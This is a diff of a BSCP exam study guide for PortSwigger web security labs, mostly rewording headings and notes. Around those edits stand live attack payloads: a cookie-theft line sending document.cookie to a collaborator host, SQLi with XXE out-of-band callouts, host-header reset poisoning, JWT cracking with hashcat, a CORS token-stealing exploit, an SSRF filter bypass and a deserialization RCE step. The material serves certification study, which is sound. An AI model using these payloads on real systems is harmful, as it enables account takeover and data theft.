@@ -5,8 +5,8 @@
   
 **[FOOTHOLD](#foothold)**  
 [Content Discovery](#content-discovery)  
-[Dom-XSS](#dom-based-xss)  
-[Cross Site Scripting](#cross-site-scripting)  
+[DOM-XSS](#dom-based-xss)  
+[XSS Cross Site Scripting](#cross-site-scripting)  
 [Web Cache Poison](#web-cache-poison)  
 [Host Headers](#host-headers)  
 [HTTP Request Smuggling](#http-request-smuggling)  
@@ -14,19 +14,19 @@
 [Authentication](#authentication)  
   
 **[PRIVILEGE ESCALATION](#privilege-escalation)**  
-[CSRF Account Takeover](#csrf-account-takeover)  
+[CSRF - Account Takeover](#csrf-account-takeover)  
 [Password Reset](#password-reset)  
-[SQL Injection](#sql-injection)  
-[JSON Web Tokens](#jwt)  
+[SQLi - SQL Injection](#sql-injection)  
+[JWT  - JSON Web Tokens](#jwt)  
 [Prototype pollution](#prototype-pollution)  
 [Access Control](#access-control)  
-[Cross-origin resource sharing](#cors)  
+[CORS - Cross-origin resource sharing](#cors)  
   
 **[DATA EXFILTRATION](#data-exfiltration)**  
-[XML entities & Injections](#xxe-injections)  
-[SSRF Server side request forgery](#ssrf---server-side-request-forgery)  
-[SSTI Server side template injection](#ssti---server-side-template-injection)  
-[File path traversal](#file-path-traversal)  
+[XXE  - XML entities & Injections](#xxe-injections)  
+[SSRF - Server side request forgery](#ssrf---server-side-request-forgery)  
+[SSTI - Server side template injection](#ssti---server-side-template-injection)  
+[LFI  - File path traversal](#file-path-traversal)  
 [File Uploads](#file-uploads)  
 [Deserialization](#deserialization)  
 [OS Command Injection](#os-command-injection)  
@@ -820,8 +820,8 @@ document.location='https://Collaborator.com/?poisoncache='+document.cookie;
 
 >***Identify*** that altered HOST headers are supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection or redirection attacks to do password reset poisoning.  
   
->Include the below ```X- ``` headers and change the username parameter on the password reset request to ```Carlos``` before sending the request.  
->In the exam if you used this exploit then it means you have no used vulnerability that require user interaction and may be used to gain access to stage 3 as admin.  
+>Include the below `X- ` headers and change the username parameter on the password reset request to `Carlos` before sending the request.  
+>In the BSCP exam if you used this exploit then it means you have not used a vulnerability that require user interaction and allow you to use an interaction vulnerability to gain access to stage 3 as admin by using exploit server `Deliver exploit to victim` function.  
 
 ```html
 X-Forwarded-Host: EXPLOIT.net
@@ -1497,7 +1497,7 @@ csrf=TOKEN&username=administrator
     
 >This is the type of vulnerability that do not require active user on application to interact with the exploit, and without any user clicking on link or interaction. Take note of vulnerabilities that do not require active user on application for the BSCP exam, as this mean in the next stage of the exam it is possible to use for example [other](#cors) interactive phishing links send to victim.   
   
->***Identify*** in the `source code` for the ```/forgot-password``` page the username is a hidden field.  
+>***Identify*** in the `source code` for the `/forgot-password` page the username is a hidden field.  
 
 ![Password reset hidden username](images/passwoed-reset-hidden-username.png)  
 
@@ -1575,7 +1575,7 @@ TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encod
 
 ### Blind SQLi no indication  
 
->Placing a single quote at end of the ```trackingid``` cookie or search parameter give no internal server error 500. Making educated guess, by using below blind SQLi payload abd combine with basic XXE technique, this then makes a call to collaboration server but no data is ex-filtrated.  
+>Placing a single quote at end of the ```trackingid``` cookie or search parameter `/search_advanced?searchTerm='` may give response `500 Internal Server Error`. Make an educated guess, by using below blind SQLi payload and combine with basic XXE technique, this then makes a call to collaboration server but no data is ex-filtrated.  
 
 ```sql
 TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//COLLABORATOR.NET/">+%25remote%3b]>'),'/l')+FROM+dual--
@@ -1586,7 +1586,7 @@ TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encod
 >Additional SQLi payload with XML for reference with ```||``` the SQL concatenation operator to concatenate two expressions that evaluate two character data types or to numeric data type and do some obfuscating.  
 
 ```
-'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % umiyp SYSTEM "http://Collaborat'||'OR.COM/">%umiyp;]>'),'/l') from dual)||'
+'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % fuzz SYSTEM "http://Collaborat'||'OR.COM/">%fuzz;]>'),'/l') from dual)||'
 ```  
 
 [OAST - Out-of-band Application Security Testing](https://portswigger.net/burp/application-security-testing/oast)  
@@ -1629,7 +1629,7 @@ TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encod
   
 ### Oracle  
 
->Identified SQL injection by using add single quote to the end of the **category** parameter value and observing response of internal server error.  
+>Identified SQL injection by adding a **single quote** to the end of the `category` parameter value and observing response of `500 Internal Server Error`.  
   
 >Retrieve the list of tables in the Oracle database:  
 
@@ -1767,7 +1767,7 @@ sqlmap -v -u 'https://TARGET.net/filter?category=*' -p 'category' --batch --flus
 
 ### JWT Weak secret  
 
->Brute force weak JWT signing key  
+>Brute force weak JWT signing key using `hashcat`.  
 
 ```bash
 hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list 
@@ -1959,7 +1959,7 @@ X-Original-URL: /admin
 
 ![cors-ajax-request.png](images/cors-ajax-request.png)  
 
->Test is CORS configuration allow access to sub-domains using below test header. If response include the ```Access-Control-Allow-Origin``` header with the origin reflect it is vulnerable.  
+>Test if the application CORS configuration will allow access to sub-domains using below test header. If response include the `Access-Control-Allow-Origin` header with the origin reflect it is vulnerable to **CORS**.  
 
 ```
 Origin: http://subdomain.TARGET.NET
@@ -1969,7 +1969,7 @@ Origin: http://subdomain.TARGET.NET
 
 ![Subdomain cors xss](images/subdomain-cors-xss.png)  
 
->Place code in the exploit server body and deliver to victim to steal AJAX session token and API key.  
+>Place code in the exploit server body and **Deliver exploit to victim** to steal the AJAX session token and API key. In the BSCP exam the cors stolen JSON data include the administrator session token, and can be used to escalate privilege.  
 
 ```html
 <script>
@@ -2150,6 +2150,7 @@ Origin: http://subdomain.TARGET.NET
   
 ## SSRF - Server Side Request Forgery  
 
+[SSRF blacklist filter](#ssrf-blacklist-filter)  
 [Absolute GET URL + HOST SSRF](#absolute-get-url--host-ssrf)  
 [XXE + SSRF](#xxe--ssrf)  
 [HOST Routing-based SSRF](#host-routing-based-ssrf)  
@@ -2157,7 +2158,7 @@ Origin: http://subdomain.TARGET.NET
 [SSRF Open Redirection](#ssrf-open-redirection)  
 [Host Header Connection State + SSRF](#host-connection-state)  
 
->SSRF attack cause the server to make a connection to internal services within the organization, or force the server to connect to arbitrary external systems, potentially leaking sensitive data.  
+>SSRF attack cause the server to make a connection to internal services within the organization, or force the server to connect to arbitrary external systems, potentially leaking sensitive data. Burp scanner may detect SSRF issue as an, `External service interaction (HTTP)`.  
   
 >SSRF Sample payloads.  
 
@@ -2176,7 +2177,11 @@ Host: localhost
 2. 017700000001  
 3. 127.1  
   
->Double URL encode characters in URL to **Obfuscate** the "a" by double-URL encoding it to ```%2561```, resulting in the bypass of blacklist filter.  
+### SSRF blacklist filter  
+
+>***Identify*** the SSRF in the `stockAPI` parameter, and bypass the block by changing the URL target localhost and admin endpoint to: `http://127.1/%2561dmin`.  
+
+>Double URL encode characters in URL to **Obfuscate** the `a` to `%2561`, resulting in the bypass of the blacklist filter.  
 
 ![ssrf obfuscated](images/ssrf-obfuscated.png)  
 
@@ -2823,7 +2828,7 @@ echo $cookie;
 
 ![Symfony phpggc gadget deserial](images/symphony-phpgcc.png)  
 
->Replace cookie value and send request to get remote code execution when cookie is deserialised server side. Ignore the server response ```HTTP/2 500 Internal Server Error```, check the collaborator if data was received.  
+>Replace cookie value and send request to get remote code execution (RCE) when cookie is deserialised server side. Ignore the server response ```HTTP/2 500 Internal Server Error```, check the collaborator if data was received.  
 
 [PortSwigger Lab: Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)  
    
